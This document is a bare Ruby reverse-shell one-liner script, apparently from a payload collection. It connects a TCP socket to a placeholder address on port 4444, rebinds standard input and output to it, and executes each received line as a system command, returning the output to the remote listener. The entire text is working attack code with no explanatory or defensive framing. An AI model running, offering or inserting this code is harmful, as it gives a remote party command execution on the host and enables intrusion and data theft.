require 'socket';
c=TCPSocket.new("0.0.0.0", 4444);
$stdin.reopen(c);
$stdout.reopen(c);
$stderr.reopen(c);
$stdin.each_line{|l|l=l.strip;next if l.length==0;
    (IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }